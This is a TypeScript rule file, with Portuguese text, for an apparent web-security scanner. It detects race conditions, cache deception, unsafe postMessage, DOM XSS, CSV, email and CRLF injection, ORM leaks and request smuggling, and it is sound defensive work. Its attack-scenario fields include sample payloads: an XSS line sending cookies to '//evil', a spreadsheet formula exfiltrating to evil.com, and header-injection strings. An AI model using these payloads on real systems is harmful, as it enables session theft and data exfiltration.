import { FileRule } from '../types';

/**
 * Técnicas de ataque web modernas que não se encaixam nas categorias clássicas:
 * race conditions, envenenamento de cache, abuso de GraphQL, mensagens
 * cross-origin e injeções em formatos derivados (CSV, cabeçalho de e-mail).
 */
export const webAttackRules: FileRule[] = [
  {
    id: 'RACE_001',
    title: 'Verificação e atualização de saldo/estoque sem transação atômica',
    category: 'Race Condition',
    severity: 'high',
    confidence: 'low',
    description:
      'O código lê um valor (saldo, estoque, créditos, cupom), decide com base nele e grava o novo valor em operações separadas, sem transação, lock ou atualização atômica.',
    impact:
      'Race condition (TOCTOU / limit overrun): requisições paralelas passam todas pela verificação antes de qualquer gravação, permitindo sacar mais do que o saldo, resgatar o mesmo cupom várias vezes ou comprar além do estoque.',
    attackScenarioDefensive:
      'O atacante dispara 50 requisições simultâneas de saque com saldo de R$ 100. Todas leem "saldo = 100" antes da primeira gravação e são aprovadas, resultando em saques muito acima do saldo real.',
    remediation:
      'Torne a operação atômica: use transação com nível de isolamento adequado, UPDATE condicional (WHERE saldo >= valor) verificando linhas afetadas, decremento atômico do banco, ou lock pessimista (SELECT ... FOR UPDATE).',
    safeExample:
      "// Atomico: o proprio banco garante a condicao\nconst r = await prisma.conta.updateMany({\n  where: { id, saldo: { gte: valor } },\n  data: { saldo: { decrement: valor } },\n});\nif (r.count === 0) throw new Error('saldo insuficiente');",
    testSuggestion:
      'Dispare N requisições simultâneas da operação com o limite no valor exato e confirme que apenas uma (ou o número correto) é aceita.',
    reference: 'OWASP A06:2025 - Insecure Design; CWE-367; CWE-362',
    patterns: [
      /if\s*\([^)]*(?:saldo|balance|estoque|stock|credits|creditos|quantidade)[^)]*[<>=][^)]*\)[\s\S]{0,200}?\.(?:update|save|set)\s*\(/i,
      /const\s+\w*(?:saldo|balance|estoque|stock|credits)\w*\s*=\s*await[\s\S]{0,240}?\.(?:update|updateOne|save)\s*\(/i,
    ],
    suppressIfProjectMatches:
      /\$transaction|BEGIN\s+TRANSACTION|FOR\s+UPDATE|SELECT\s+FOR\s+UPDATE|\bdecrement\b|\bincrement\b|serializable/i,
    fileExtensions: ['.js', '.ts', '.mjs', '.cjs'],
  },
  {
    id: 'RACE_002',
    title: 'Upload/verificação de arquivo com janela TOCTOU',
    category: 'Race Condition',
    severity: 'medium',
    confidence: 'low',
    description:
      'O arquivo é validado (tipo, tamanho, antivírus) e só depois movido/renomeado, deixando uma janela em que ele já está acessível no caminho final ou pode ser trocado.',
    impact:
      'Entre a validação e a movimentação, o arquivo pode ser substituído ou acessado — permitindo servir conteúdo malicioso que passou pela checagem inicial.',
    attackScenarioDefensive:
      'O atacante envia um arquivo válido, e enquanto a validação ocorre, sobrescreve o mesmo caminho temporário com um script; a aplicação move para a pasta pública o conteúdo malicioso já aprovado.',
    remediation:
      'Valide o arquivo já no destino final não-público, use nomes aleatórios não previsíveis, e só torne o arquivo acessível após toda a validação concluída (mover é operação atômica no mesmo filesystem).',
    safeExample:
      "const tmp = path.join(DIR_PRIVADO, crypto.randomUUID());\nawait fs.promises.writeFile(tmp, buffer);\nawait validar(tmp);\nawait fs.promises.rename(tmp, path.join(DIR_PUBLICO, nomeSeguro)); // atomico",
    testSuggestion:
      'Verifique que o arquivo só fica acessível publicamente depois de toda a validação, e que o nome final não é previsível.',
    reference: 'CWE-367 - Time-of-check Time-of-use; OWASP A06:2025',
    patterns: [
      /(?:validate|validar|checkFile|scanFile|verify)\w*\s*\([^)]*\)[\s\S]{0,200}?(?:fs\.)?(?:rename|renameSync|copyFile|mv)\s*\(/i,
    ],
    fileExtensions: ['.js', '.ts', '.mjs', '.cjs'],
  },
  {
    id: 'CACHE_001',
    title: 'Resposta autenticada marcada como cacheável publicamente',
    category: 'Cache',
    severity: 'high',
    confidence: 'medium',
    description:
      'Rota que retorna dados de usuário autenticado define Cache-Control público/com max-age, ou usa cache de CDN/edge sem variar por usuário.',
    impact:
      'Web cache deception/poisoning: a resposta com dados privados de um usuário fica armazenada no CDN e é servida para outros visitantes, vazando informações pessoais em massa.',
    attackScenarioDefensive:
      'O atacante induz a vítima a acessar /perfil/dados.css; o CDN vê a extensão estática, guarda a resposta autenticada em cache e o atacante depois requisita a mesma URL, recebendo os dados privados da vítima.',
    remediation:
      'Marque respostas autenticadas como Cache-Control: private, no-store. Se precisar cachear, inclua a identidade na chave de cache (Vary: Authorization/Cookie) e normalize as URLs para evitar deception por extensão.',
    safeExample:
      "res.set('Cache-Control', 'private, no-store, max-age=0');\nres.set('Vary', 'Authorization, Cookie');\nres.json(dadosDoUsuario);",
    testSuggestion:
      'Requisite uma rota autenticada e inspecione os headers: deve conter private/no-store e nunca public.',
    reference: 'OWASP A02:2025; CWE-524 - Use of Cache Containing Sensitive Information',
    patterns: [
      /Cache-Control["'`]?\s*[,:]\s*["'`][^"'`]*public[^"'`]*["'`][\s\S]{0,200}?(?:req\.user|session|authUser|currentUser)/i,
      /(?:req\.user|session\.user|authUser)[\s\S]{0,200}?setHeader\s*\(\s*["'`]Cache-Control["'`]\s*,\s*["'`][^"'`]*(?:public|max-age=[1-9])/i,
    ],
    fileExtensions: ['.js', '.ts', '.mjs', '.cjs'],
  },
  {
    id: 'GQL_001',
    title: 'GraphQL sem limite de profundidade/complexidade de query',
    category: 'API',
    severity: 'medium',
    confidence: 'low',
    description:
      'Servidor GraphQL instanciado sem plugin/validação de profundidade (depth limit) ou custo (complexity) de query.',
    impact:
      'Queries profundamente aninhadas ou recursivas geram explosão combinatória de resolvers e consultas ao banco, derrubando o servidor com uma única requisição (DoS assimétrico).',
    attackScenarioDefensive:
      'O atacante envia uma query com 20 níveis de aninhamento entre tipos que se referenciam (autor -> posts -> autor -> posts...), fazendo o servidor executar milhões de resolvers e esgotar CPU e conexões do banco.',
    remediation:
      'Aplique limite de profundidade (graphql-depth-limit) e de custo (graphql-query-complexity), habilite paginação obrigatória em listas e defina timeout por operação.',
    safeExample:
      "import depthLimit from 'graphql-depth-limit';\nconst server = new ApolloServer({\n  schema,\n  validationRules: [depthLimit(7)],\n  introspection: process.env.NODE_ENV !== 'production',\n});",
    testSuggestion:
      'Envie uma query com aninhamento profundo (ex.: 15 níveis) e confirme que o servidor a rejeita antes de executá-la.',
    reference: 'OWASP API4:2023 - Unrestricted Resource Consumption; CWE-770',
    patterns: [
      /new\s+ApolloServer\s*\(\s*\{/,
      /(?:graphqlHTTP|createYoga|createHandler)\s*\(\s*\{/,
    ],
    suppressIfProjectMatches:
      /depthLimit|createComplexityRule|queryComplexity|graphql-depth-limit|costAnalysis|armor/i,
    fileExtensions: ['.js', '.ts', '.mjs', '.cjs'],
  },
  {
    id: 'XSS_101',
    title: 'postMessage sem verificação de origem',
    category: 'XSS',
    severity: 'high',
    confidence: 'medium',
    description:
      'Listener de mensagens cross-window que usa event.data sem validar event.origin, ou envio via postMessage com targetOrigin "*".',
    impact:
      'Qualquer site que consiga abrir/embutir a página pode enviar mensagens forjadas e injetar dados na aplicação; com targetOrigin "*", dados sensíveis (tokens) são entregues a qualquer origem que esteja escutando.',
    attackScenarioDefensive:
      'Um site malicioso abre a aplicação em iframe e envia postMessage com um payload; como o listener não verifica origin, o dado é processado e chega a um sink perigoso, resultando em XSS ou roubo de token.',
    remediation:
      'Valide sempre event.origin contra uma allowlist exata antes de usar event.data, e especifique o targetOrigin exato ao enviar — nunca "*" quando houver dado sensível.',
    safeExample:
      "window.addEventListener('message', event => {\n  if (event.origin !== 'https://app.confiavel.com') return;\n  const dados = JSON.parse(event.data);\n  // ...\n});\niframe.contentWindow.postMessage(payload, 'https://app.confiavel.com');",
    testSuggestion:
      'Envie um postMessage de uma origem não autorizada e confirme que a mensagem é ignorada.',
    reference: 'OWASP A05:2025; CWE-346 - Origin Validation Error',
    patterns: [
      /addEventListener\s*\(\s*["'`]message["'`]\s*,\s*(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{(?:(?!\.origin)[\s\S]){0,300}?(?:event|e|msg)\.data/i,
      /postMessage\s*\([^,]+,\s*["'`]\*["'`]\s*\)/,
    ],
    fileExtensions: ['.js', '.ts', '.jsx', '.tsx', '.mjs'],
  },
  {
    id: 'XSS_102',
    title: 'Sink DOM perigoso com dado dinâmico (innerHTML/document.write)',
    category: 'XSS',
    severity: 'high',
    confidence: 'medium',
    description:
      'Atribuição a innerHTML/outerHTML, document.write ou insertAdjacentHTML usando valores dinâmicos (location, params, resposta de API) sem sanitização.',
    impact:
      'DOM-based XSS: o atacante controla parte do HTML inserido e executa JavaScript no contexto da aplicação, roubando sessão, tokens e realizando ações em nome do usuário.',
    attackScenarioDefensive:
      'A página insere no innerHTML um valor lido de location.hash. O atacante envia um link com #<img src=x onerror=fetch("//evil/?c="+document.cookie)> e a vítima que clicar tem a sessão exfiltrada.',
    remediation:
      'Prefira textContent para texto puro. Se precisar de HTML, sanitize com DOMPurify e configure uma CSP restritiva como defesa em profundidade.',
    safeExample:
      "el.textContent = valorDinamico; // seguro para texto\n// Se HTML for necessario:\nimport DOMPurify from 'dompurify';\nel.innerHTML = DOMPurify.sanitize(htmlDinamico);",
    testSuggestion:
      'Injete <img src=x onerror=alert(1)> nos parâmetros/hash da URL e confirme que nada é executado.',
    reference: 'OWASP A05:2025 - Injection; CWE-79',
    patterns: [
      /\.(?:innerHTML|outerHTML)\s*=\s*(?:[^;\n]*(?:location|document\.URL|window\.name|params|searchParams|hash)|`[^`]*\$\{)/i,
      /document\.write(?:ln)?\s*\(\s*(?:[^)]*(?:location|document\.URL|params|hash)|`[^`]*\$\{)/i,
      /insertAdjacentHTML\s*\([^,]+,\s*(?:[^)]*(?:location|params|hash)|`[^`]*\$\{)/i,
    ],
    fileExtensions: ['.js', '.ts', '.jsx', '.tsx', '.mjs', '.html'],
  },
  {
    id: 'INJ_101',
    title: 'Injeção de fórmula em exportação CSV/XLSX',
    category: 'Injeção',
    severity: 'medium',
    confidence: 'low',
    description:
      'Geração de CSV/planilha concatenando dados fornecidos por usuários sem neutralizar células que começam com =, +, -, @, tab ou CR.',
    impact:
      'CSV/Formula Injection: ao abrir o arquivo no Excel/Sheets, a célula é interpretada como fórmula e pode executar comandos locais ou exfiltrar dados da planilha para um servidor externo.',
    attackScenarioDefensive:
      'O atacante cadastra o nome =HYPERLINK("http://evil.com?d="&A1,"clique"); um administrador exporta o relatório de usuários e, ao abrir no Excel, os dados da planilha são enviados ao servidor do atacante.',
    remediation:
      'Prefixe com apóstrofo (\') ou espaço qualquer célula que comece com = + - @ TAB CR, ou envolva o valor entre aspas escapando aspas internas. Bibliotecas de CSV maduras têm essa opção.',
    safeExample:
      "function celulaSegura(v) {\n  const s = String(v ?? '');\n  return /^[=+\\-@\\t\\r]/.test(s) ? `'${s}` : s;\n}\nconst linha = campos.map(celulaSegura).join(',');",
    testSuggestion:
      'Cadastre um valor começando com "=" e exporte: ao abrir na planilha, ele deve aparecer como texto, não como fórmula.',
    reference: 'OWASP CSV Injection; CWE-1236',
    patterns: [
      /(?:csv|CSV)[\s\S]{0,80}?(?:join\s*\(\s*["'`],["'`]\s*\)|\.map\s*\([^)]*\)\.join)/,
      /(?:writeFile|createWriteStream|Content-Type["'`]?\s*[,:]\s*["'`]text\/csv)[\s\S]{0,200}?\$\{/i,
    ],
    fileExtensions: ['.js', '.ts', '.mjs', '.cjs'],
  },
  {
    id: 'INJ_102',
    title: 'Injeção de cabeçalho em envio de e-mail',
    category: 'Injeção',
    severity: 'medium',
    confidence: 'medium',
    description:
      'Campos de e-mail (to, from, subject, replyTo) montados com entrada do usuário sem remover quebras de linha (CR/LF).',
    impact:
      'Header injection: quebras de linha permitem inserir cabeçalhos extras (Bcc, Cc, Content-Type), transformando a aplicação em relay de spam/phishing enviado a partir do seu domínio — o que também queima a reputação do remetente.',
    attackScenarioDefensive:
      'No campo de contato, o atacante envia "vitima@x.com\\nBcc: milhares@alvos.com"; o servidor SMTP interpreta o Bcc e distribui a mensagem em massa com a assinatura do seu domínio.',
    remediation:
      'Valide os endereços com schema estrito e remova \\r e \\n de todos os campos antes de montar a mensagem. Prefira APIs que tratem os campos estruturalmente em vez de concatenar cabeçalhos.',
    safeExample:
      "const limpar = (s) => String(s).replace(/[\\r\\n]/g, '').slice(0, 200);\nawait transporter.sendMail({\n  to: emailValidadoPorSchema,\n  subject: limpar(req.body.subject),\n  text: req.body.message,\n});",
    testSuggestion:
      'Envie um assunto contendo \\nBcc: outro@dominio.com e confirme que nenhum cabeçalho extra é criado.',
    reference: 'OWASP A05:2025 - Injection; CWE-93 - CRLF Injection',
    patterns: [
      /(?:sendMail|send_mail|mail\.send|sendEmail)\s*\(\s*\{[^}]{0,200}(?:to|from|subject|replyTo|cc|bcc)\s*:\s*req\.(?:body|query|params)\./i,
      /(?:to|subject|from)\s*:\s*`[^`]*\$\{[^}]*req\.(?:body|query|params)[^}]*\}[^`]*`/i,
    ],
    fileExtensions: ['.js', '.ts', '.mjs', '.cjs'],
  },
  {
    id: 'ORM_001',
    title: 'Filtro de ORM controlado pelo cliente (ORM Leak)',
    category: 'Injeção',
    severity: 'high',
    confidence: 'medium',
    description:
      'Objeto de filtro (where/filter) repassado diretamente do request para o ORM (Prisma, Sequelize, TypeORM, Mongoose), permitindo que o cliente escolha campos e operadores da consulta.',
    impact:
      'ORM Leak: com operadores como startsWith/contains/gt o atacante extrai, caractere a caractere, colunas que a API nunca retorna — senha, hash, token de reset, segredo de MFA — apenas observando quais filtros retornam resultado.',
    attackScenarioDefensive:
      'O atacante chama /users?filter[password][startsWith]=a e observa a diferença de resposta; repetindo para cada caractere, reconstrói o hash da senha (ou o token de reset) de outro usuário sem nunca vê-lo diretamente.',
    remediation:
      'Nunca repasse o filtro do cliente ao ORM. Valide com schema estrito (Zod/Joi) permitindo apenas campos e operadores previstos, monte o where no servidor e use select explícito para nunca trafegar colunas sensíveis.',
    safeExample:
      "const Q = z.object({ nome: z.string().max(64).optional(), email: z.string().email().optional() }).strict();\nconst q = Q.parse(req.query);\nconst where = {};\nif (q.nome) where.nome = { contains: q.nome }; // operador definido pelo servidor\nawait prisma.user.findMany({\n  where,\n  select: { id: true, nome: true, email: true }, // nunca password/token\n  take: 50,\n});",
    testSuggestion:
      'Envie filter[password][startsWith]=a (ou {"password":{"$ne":null}}) e confirme que a API rejeita o campo em vez de filtrar por ele.',
    reference: 'PortSwigger Top 10 Web Hacking Techniques 2025 (ORM Leak); OWASP API3:2023; CWE-200',
    patterns: [
      /(?:where|filter)\s*:\s*req\.(?:query|body|params)\b/i,
      /\.(?:findMany|findAll|findOne|findFirst|count)\s*\(\s*\{\s*where\s*:\s*(?:req\.(?:query|body)|\.\.\.req\.(?:query|body))/i,
      /\.(?:findMany|findAll)\s*\(\s*req\.(?:query|body)\s*\)/i,
    ],
    fileExtensions: ['.js', '.ts', '.mjs', '.cjs'],
  },
  {
    id: 'SMUG_001',
    title: 'Parser HTTP leniente habilitado (insecureHTTPParser)',
    category: 'Injeção',
    severity: 'high',
    confidence: 'high',
    description:
      'Servidor ou cliente HTTP criado com insecureHTTPParser: true, que reativa a aceitação de mensagens malformadas rejeitadas pelo parser estrito.',
    impact:
      'Reabre a porta para HTTP Request Smuggling: divergências de interpretação de Content-Length/Transfer-Encoding entre proxy e origem permitem envenenar a fila de requisições, capturar requisições de outros usuários e contornar controles de acesso da borda.',
    attackScenarioDefensive:
      'O atacante envia uma requisição com Content-Length e Transfer-Encoding conflitantes; o proxy lê de um jeito e a origem (com parser leniente) de outro, fazendo parte do corpo ser tratada como uma nova requisição — que é servida ao próximo usuário da conexão.',
    remediation:
      'Remova insecureHTTPParser. Mantenha o parser estrito do Node, normalize/remova headers hop-by-hop em proxies próprios e garanta que borda e origem usem a mesma interpretação de framing.',
    safeExample:
      "const server = http.createServer(app); // parser estrito (padrao)\n// Em proxy proprio, limpe hop-by-hop antes de encaminhar:\nfor (const h of ['transfer-encoding','connection','keep-alive','upgrade','te','trailer']) {\n  delete proxyReq.headers[h];\n}",
    testSuggestion:
      'Confirme que nenhuma instância de servidor/cliente HTTP usa insecureHTTPParser e que requisições com CL+TE conflitantes são rejeitadas com 400.',
    reference: 'CWE-444 - HTTP Request Smuggling; PortSwigger HTTP Request Smuggling',
    patterns: [
      /insecureHTTPParser\s*:\s*true/,
      /--insecure-http-parser/,
    ],
    fileExtensions: ['.js', '.ts', '.mjs', '.cjs', '.json'],
  },
  {
    id: 'SMUG_002',
    title: 'Header de resposta montado com entrada do usuário (CRLF injection)',
    category: 'Injeção',
    severity: 'medium',
    confidence: 'medium',
    description:
      'Valor vindo do request (req.query/body/params/headers) usado diretamente em setHeader/writeHead sem remover CR e LF.',
    impact:
      'Response splitting/CRLF injection: quebras de linha injetadas criam headers arbitrários ou até um segundo corpo de resposta, viabilizando envenenamento de cache, fixação de cookie e XSS refletido.',
    attackScenarioDefensive:
      'O atacante envia ?id=a%0d%0aSet-Cookie:%20session=forjado; o valor é ecoado em setHeader e o navegador da vítima passa a usar o cookie de sessão escolhido pelo atacante (session fixation).',
    remediation:
      'Nunca interpole entrada do usuário em headers sem sanitizar. Remova \\r e \\n, limite o tamanho e valide contra um conjunto de caracteres seguro antes de definir o header.',
    safeExample:
      "const SEGURO = /^[\\x20-\\x7E]{1,200}$/; // sem CR/LF\nconst id = String(req.query.id ?? '');\nif (SEGURO.test(id)) res.setHeader('X-Request-Id', id);",
    testSuggestion:
      'Envie %0d%0a no parâmetro refletido em header e confirme que nenhum header extra é criado na resposta.',
    reference: 'CWE-113 - HTTP Response Splitting; OWASP A05:2025',
    patterns: [
      /res\.setHeader\s*\(\s*["'`][^"'`]+["'`]\s*,\s*req\.(?:query|body|params|headers)\./i,
      /res\.writeHead\s*\([^)]*\{[^}]*`[^`]*\$\{[^}]*req\.(?:query|body|params)/i,
    ],
    fileExtensions: ['.js', '.ts', '.mjs', '.cjs'],
  },
];
